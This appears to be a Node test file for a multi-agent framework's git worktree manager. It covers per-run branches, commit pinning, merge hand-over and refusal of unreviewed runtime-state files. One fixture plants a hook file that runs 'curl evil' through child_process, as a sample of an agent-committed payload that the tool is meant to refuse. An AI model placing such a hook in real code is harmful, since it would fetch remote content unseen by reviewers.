import { test } from 'node:test';
import assert from 'node:assert/strict';
import { access, chmod, mkdir, mkdtemp, readFile, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { makeRunId, makeTaskId } from '@maf/types';
import { WorktreeManager, resolveWorkingDir } from '../WorktreeManager.js';
import type { RunWorktree } from '../WorktreeManager.js';
import { BranchIsolator } from '../BranchIsolator.js';
import { makeRepo, commitFile, git } from './gitTestUtils.js';

const RUN = makeRunId('r1');

async function exists(p: string): Promise<boolean> {
  try { await access(p); return true; } catch { return false; }
}

test('createForRun() checks out .maf/worktrees/<runId> on a new maf/<runId> branch at the current HEAD', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const head = await git(['rev-parse', 'HEAD'], repo);

  const wt = await new WorktreeManager(repo).createForRun(RUN);

  assert.equal(wt.path, path.join(repo, '.maf', 'worktrees', 'r1'));
  assert.equal(wt.branch, 'maf/r1');
  assert.equal(wt.baseCommit, head);
  assert.equal(wt.cwd, wt.path, 'at the repository top the run works at the worktree root');
  assert.equal(await git(['rev-parse', '--show-toplevel'], wt.path), await realpath(wt.path), 'it is a worktree of its own');
  assert.equal(await git(['symbolic-ref', 'HEAD'], wt.path), 'refs/heads/maf/r1');
  assert.equal(await git(['rev-parse', 'HEAD'], wt.path), head);
  assert.equal(await git(['symbolic-ref', 'HEAD'], repo), 'refs/heads/main', "the user's checkout stays on its branch");
});

test('createForRun() refuses a repository with no commits, and says so', async (t) => {
  const repo = await mkdtemp(path.join(tmpdir(), 'maf-git-unborn-'));
  t.after(() => rm(repo, { recursive: true, force: true }));
  await git(['init', '-q'], repo);

  await assert.rejects(() => new WorktreeManager(repo).createForRun(RUN), /has no commits yet.*--no-worktree/s);
  assert.equal(await exists(path.join(repo, '.maf')), false, 'nothing was created');
});

test('createForRun() refuses when the branch maf/<runId> already exists', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  await git(['branch', 'maf/r1'], repo);

  await assert.rejects(() => new WorktreeManager(repo).createForRun(RUN), /branch maf\/r1 already exists/);
  assert.equal(await exists(path.join(repo, '.maf', 'worktrees', 'r1')), false);
});

test('createForRun() refuses a run id that is not safe as both a branch and a directory name', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);

  for (const bad of ['../escape', 'a/b', '', '-x', 'a b', 'x.lock', 'x'.repeat(129)]) {
    await assert.rejects(() => mgr.createForRun(makeRunId(bad)), /expected a run id/, JSON.stringify(bad));
  }
  assert.equal(await exists(path.join(repo, '.maf')), false);
});

test('createForRun() refuses a directory that is not in a git repository', async (t) => {
  const dir = await mkdtemp(path.join(tmpdir(), 'maf-git-none-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  await assert.rejects(() => new WorktreeManager(dir).createForRun(RUN), /not inside a git repository/);
});

test('createForRun() from a subdirectory: the run works in the same subdirectory of its worktree', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  await mkdir(path.join(repo, 'pkg'));
  await commitFile(repo, 'pkg/a.txt', 'a\n', 'add pkg');

  const wt = await new WorktreeManager(path.join(repo, 'pkg')).createForRun(RUN);

  assert.equal(wt.path, path.join(repo, 'pkg', '.maf', 'worktrees', 'r1'));
  assert.equal(wt.cwd, path.join(wt.path, 'pkg'));
  assert.equal(await readFile(path.join(wt.cwd, 'a.txt'), 'utf8'), 'a\n');
});

for (const how of ['untracked', 'ignored'] as const) {
  test(`createForRun() from an ${how} directory refuses, and leaves no worktree or branch behind`, async (t) => {
    const repo = await makeRepo();
    t.after(() => rm(repo, { recursive: true, force: true }));
    if (how === 'ignored') await commitFile(repo, '.gitignore', 'newpkg/\n', 'ignore newpkg');
    await mkdir(path.join(repo, 'newpkg'));
    await writeFile(path.join(repo, 'newpkg', 'index.ts'), 'export {};\n', 'utf8');
    const dir = path.join(repo, 'newpkg');

    // A worktree holds only committed content, so newpkg has no counterpart in it.
    await assert.rejects(() => new WorktreeManager(dir).createForRun(RUN), (err: Error) => {
      assert.equal(err.message, `cannot create a worktree for run r1: ${dir} has no committed files; commit it or run with --no-worktree.`);
      return true;
    });
    assert.equal(await exists(path.join(dir, '.maf', 'worktrees', 'r1')), false, 'the worktree was removed again');
    assert.equal(await git(['branch', '--list', 'maf/r1'], repo), '', 'and so was its branch');
    assert.doesNotMatch(await git(['worktree', 'list', '--porcelain'], repo), /worktrees\/r1/, "and git's record of it");
  });
}

test('finish(success) returns the merge command and does not merge', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await commitFile(wt.cwd, 'feature.txt', 'done\n', 'run work');
  const userHead = await git(['rev-parse', 'HEAD'], repo);

  const result = await mgr.finish(RUN, 'success');

  assert.deepEqual(result, { kind: 'merge', mergeCommand: 'git merge maf/r1', path: wt.path, branch: 'maf/r1' });
  assert.equal(await git(['rev-parse', 'HEAD'], repo), userHead, 'nothing was merged into the user branch');
  assert.equal(await exists(path.join(repo, 'feature.txt')), false);
  assert.ok(await exists(wt.path), 'the worktree is not removed unasked');
  assert.notEqual(await git(['branch', '--list', 'maf/r1'], repo), '', 'nor is the branch');
});

test('finish(success) commits work the run left uncommitted, so the merge command carries it', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'loose.txt'), 'written, never committed\n', 'utf8');
  // Runtime state is never part of the run's result, exactly as it is never part of the reviewed diff.
  await mkdir(path.join(wt.cwd, '.maf', 'transcripts'), { recursive: true });
  await writeFile(path.join(wt.cwd, '.maf', 'transcripts', 'run.jsonl'), '{}\n', 'utf8');

  await mgr.finish(RUN, 'success');

  assert.equal(await git(['show', 'maf/r1:loose.txt'], repo), 'written, never committed');
  assert.equal(await git(['ls-tree', '-r', '--name-only', 'maf/r1', '--', '.maf'], repo), '', 'runtime state was not committed');
  await git(['merge', '--ff-only', 'maf/r1'], repo);
  assert.equal(await readFile(path.join(repo, 'loose.txt'), 'utf8'), 'written, never committed\n', 'the printed command brings the work in');
});

test('finish(success) refuses, with no merge command, a branch that brings in runtime state the gate never reviews', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  // What the run commits itself never passes through finish's pathspec, and the security gate's
  // diff leaves .maf/runs out (D-29): merging this branch would take in a file nothing reviewed.
  await mkdir(path.join(wt.cwd, '.maf', 'runs'), { recursive: true });
  await writeFile(path.join(wt.cwd, '.maf', 'runs', 'hook.js'), 'require("child_process").exec("curl evil")\n', 'utf8');
  await writeFile(path.join(wt.cwd, 'ok.txt'), 'reviewed work\n', 'utf8');
  await git(['add', '.maf/runs/hook.js', 'ok.txt'], wt.cwd);
  await git(['commit', '-q', '-m', 'agent commit'], wt.cwd);

  const result = await mgr.finish(RUN, 'success');

  assert.deepEqual(result, { kind: 'refused', paths: ['.maf/runs/hook.js'], path: wt.path, branch: 'maf/r1' });
  assert.equal('mergeCommand' in result, false, 'a refusal carries no merge command');
  assert.ok(await exists(wt.path), 'the worktree is kept for inspection');
});

test('finish(success) on a branch still at its base says so instead of printing a merge command', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  // Runtime state alone is not a change: finish never commits it.
  await mkdir(path.join(wt.cwd, '.maf', 'transcripts'), { recursive: true });
  await writeFile(path.join(wt.cwd, '.maf', 'transcripts', 'run.jsonl'), '{}\n', 'utf8');

  const result = await mgr.finish(RUN, 'success');

  assert.deepEqual(result, { kind: 'no-change', path: wt.path, branch: 'maf/r1' });
  assert.equal(await git(['rev-parse', 'maf/r1'], repo), wt.baseCommit, 'nothing was committed');
});

test('finish(success) commits as maf <maf@maf.invalid>, unsigned, with no hook run — whatever the repository configures', async (t) => {
  // No repo-local identity, signing forced on with a gpg that always fails, and a pre-commit hook
  // that fails: each would break the commit (or misattribute it) if finish did not pin them.
  const repo = await mkdtemp(path.join(tmpdir(), 'maf-git-noident-'));
  t.after(() => rm(repo, { recursive: true, force: true }));
  await git(['init', '-q', '-b', 'main'], repo);
  await writeFile(path.join(repo, 'README.md'), '# r\n', 'utf8');
  await git(['add', '.'], repo);
  await git(['-c', 'user.name=u', '-c', 'user.email=u@example.com', 'commit', '-q', '-m', 'initial'], repo);
  await git(['config', 'commit.gpgsign', 'true'], repo);
  await git(['config', 'gpg.program', '/bin/false'], repo);
  const marker = path.join(repo, 'hook-ran');
  await writeFile(path.join(repo, '.git', 'hooks', 'pre-commit'), `#!/bin/sh\ntouch '${marker}'\nexit 1\n`, 'utf8');
  await chmod(path.join(repo, '.git', 'hooks', 'pre-commit'), 0o755);
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'loose.txt'), 'left uncommitted\n', 'utf8');

  const result = await mgr.finish(RUN, 'success');

  assert.equal(result.kind, 'merge');
  assert.equal(await git(['log', '-1', '--format=%an <%ae>|%cn <%ce>', 'maf/r1'], repo), 'maf <maf@maf.invalid>|maf <maf@maf.invalid>');
  assert.doesNotMatch(await git(['cat-file', 'commit', 'maf/r1'], repo), /^gpgsig /m, 'the commit is not signed');
  assert.equal(await exists(marker), false, 'the pre-commit hook did not run');
});

test('finish(success) from a subdirectory: runtime state is the project\'s .maf, not the repository top\'s', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  await mkdir(path.join(repo, 'pkg'));
  await commitFile(repo, 'pkg/a.txt', 'a\n', 'add pkg');
  const mgr = new WorktreeManager(path.join(repo, 'pkg'));
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'loose.txt'), 'work\n', 'utf8');
  await mkdir(path.join(wt.cwd, '.maf', 'transcripts'), { recursive: true });
  await writeFile(path.join(wt.cwd, '.maf', 'transcripts', 'run.jsonl'), '{}\n', 'utf8');
  // A .maf/ elsewhere in the repository is ordinary content: reviewed, so committed and not refused.
  await mkdir(path.join(wt.path, '.maf', 'runs'), { recursive: true });
  await writeFile(path.join(wt.path, '.maf', 'runs', 'top.txt'), 'ordinary\n', 'utf8');

  const result = await mgr.finish(RUN, 'success');

  assert.equal(result.kind, 'merge');
  assert.equal(await git(['ls-tree', '-r', '--name-only', 'maf/r1', '--', 'pkg/loose.txt', '.maf/runs/top.txt'], repo),
    '.maf/runs/top.txt\npkg/loose.txt');
  assert.equal(await git(['ls-tree', '-r', '--name-only', 'maf/r1', '--', 'pkg/.maf'], repo), '', "the project's runtime state was not committed");

  // And committed by the run itself, the project's runtime state is refused.
  await mkdir(path.join(wt.cwd, '.maf', 'runs'), { recursive: true });
  await commitFile(wt.cwd, '.maf/runs/x.json', '{}\n', 'agent commit');
  assert.deepEqual(await mgr.finish(RUN, 'success'),
    { kind: 'refused', paths: ['pkg/.maf/runs/x.json'], path: wt.path, branch: 'maf/r1' });
});

test('finish(success) with runtime state a committed .gitignore already ignores inside the worktree: the work is committed, the state is not', async (t) => {
  // `git add` refuses a pathspec item naming an ignored path, an exclusion included ("The following paths
  // are ignored…", exit 1). A repository whose .gitignore lists MAF's runtime state — MAF's own does —
  // made every hand-over fail once a run left state in its worktree; finish now builds the gate's pathspec.
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  await mkdir(path.join(repo, 'pkg'));
  await writeFile(path.join(repo, '.gitignore'), '.maf/transcripts/\npkg/.maf/runs\n', 'utf8');
  await commitFile(repo, 'pkg/a.txt', 'a\n', 'add pkg');
  await git(['add', '.gitignore'], repo);
  await git(['commit', '-q', '-m', 'ignore runtime state'], repo);

  for (const [runId, dir, prefix] of [[makeRunId('top1'), repo, ''], [makeRunId('sub1'), path.join(repo, 'pkg'), 'pkg/']] as const) {
    const mgr = new WorktreeManager(dir);
    const wt = await mgr.createForRun(runId);
    await writeFile(path.join(wt.cwd, 'loose.txt'), 'work\n', 'utf8');
    // Ignored runtime state, where the hand-over's pathspec names it; and one entry nothing ignores.
    for (const state of ['transcripts', 'runs']) {
      await mkdir(path.join(wt.cwd, '.maf', state), { recursive: true });
      await writeFile(path.join(wt.cwd, '.maf', state, 'x.json'), '{}\n', 'utf8');
    }
    await writeFile(path.join(wt.cwd, '.maf', 'lcm.db'), 'not ignored by anything\n', 'utf8');
    assert.match(await git(['check-ignore', '--', `${prefix}.maf/transcripts`, `${prefix}.maf/runs`], wt.path), /\.maf\//,
      'the fixture: at least one runtime-state entry is ignored inside the worktree');

    const result = await mgr.finish(runId, 'success');

    assert.equal(result.kind, 'merge', JSON.stringify(result));
    const branch = `maf/${runId}`;
    assert.equal(await git(['show', `${branch}:${prefix}loose.txt`], repo), 'work', 'the work is committed');
    assert.equal(await git(['ls-tree', '-r', '--name-only', branch, '--', `${prefix}.maf`], repo), '', 'the runtime state is not, ignored or not');
  }
});

test("finish(success) reports a failed commit in a full sentence, not git's raw output", async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'loose.txt'), 'work\n', 'utf8');
  // A held index lock makes `git add` fail, as a concurrent git process in the worktree would.
  await writeFile(path.join(repo, '.git', 'worktrees', 'r1', 'index.lock'), '', 'utf8');

  await assert.rejects(() => mgr.finish(RUN, 'success'), (err: Error) => {
    assert.match(err.message, /^cannot commit the work run r1 left uncommitted in .* to maf\/r1 \(git said: .*index\.lock.*\)\. Nothing was merged/s);
    assert.doesNotMatch(err.message, /Command failed/);
    return true;
  });
});

test('finish(failure) keeps the worktree exactly as the run left it and returns its path', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'half.txt'), 'half-done\n', 'utf8');

  const result = await mgr.finish(RUN, 'failure');

  assert.deepEqual(result, { kind: 'failure', path: wt.path, branch: 'maf/r1' });
  assert.equal(await readFile(path.join(wt.cwd, 'half.txt'), 'utf8'), 'half-done\n');
  assert.equal(await git(['rev-parse', 'maf/r1'], repo), wt.baseCommit, 'nothing was committed on failure');
});

test('remove() deletes the worktree and its branch — and only remove() does', async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  await writeFile(path.join(wt.cwd, 'leftover.txt'), 'uncommitted\n', 'utf8');
  await mgr.finish(RUN, 'failure');
  assert.ok(await exists(wt.path));

  await mgr.remove(RUN);

  assert.equal(await exists(wt.path), false, 'worktree directory is gone');
  assert.equal(await git(['branch', '--list', 'maf/r1'], repo), '', 'branch is gone');
  assert.doesNotMatch(await git(['worktree', 'list'], repo), /worktrees\/r1/, "git's record of it is gone");
});

test("remove() also deletes the run's task branches, but never a live run's branch of the same shape", async (t) => {
  const repo = await makeRepo();
  t.after(() => rm(repo, { recursive: true, force: true }));
  const mgr = new WorktreeManager(repo);
  const wt = await mgr.createForRun(RUN);
  const iso = new BranchIsolator(wt);
  await iso.createBranch(makeTaskId('t1'));
  await iso.createBranch(makeTaskId('t2'));
  // `maf/r1-live` is run r1-live's own branch, checked out in its worktree — not one of r1's tasks.
  await mgr.createForRun(makeRunId('r1-live'));

  await mgr.remove(RUN);

  assert.equal(await git(['for-each-ref', '--format=%(refname:short)', 'refs/heads/maf/'], repo), 'maf/r1-live');
});

test('the per-task worktree API is gone: one worktree per run (D-03)', () => {
  // Nothing called create(taskId, runId), get, getAll or pruneStale; the whole-repo typecheck is
  // what proves it, and this keeps them from coming back.
  const proto = WorktreeManager.prototype as unknown as Record<string, unknown>;
  for (const name of ['create', 'get', 'getAll', 'pruneStale']) assert.equal(proto[name], undefined, name);
});

// ── resolveWorkingDir: the --no-worktree decision, as a pure function ────────────────────

const RUN_WT: RunWorktree = {
  runId: RUN, path: '/repo/.maf/worktrees/r1', branch: 'maf/r1', baseCommit: 'a'.repeat(40),
  cwd: '/repo/.maf/worktrees/r1/sub',
};

test('resolveWorkingDir: by default the run works in its worktree, with no warning', () => {
  assert.deepEqual(resolveWorkingDir({ dir: '/repo/sub', worktree: true, run: RUN_WT }), { cwd: RUN_WT.cwd, isolated: true });
});

test('resolveWorkingDir: --no-worktree runs in place, not isolated, and warns', () => {
  const d = resolveWorkingDir({ dir: '/repo/sub', worktree: false });
  assert.equal(d.cwd, path.resolve('/repo/sub'));
  assert.equal(d.isolated, false);
  assert.match(d.warning ?? '', /in place/);
  assert.match(d.warning ?? '', /MAF cannot undo them/);
});

test('resolveWorkingDir: a contradiction is an error, not a guess', () => {
  assert.throws(() => resolveWorkingDir({ dir: '/repo', worktree: true }), /createForRun/);
  assert.throws(() => resolveWorkingDir({ dir: '/repo', worktree: false, run: RUN_WT }), /--no-worktree/);
});
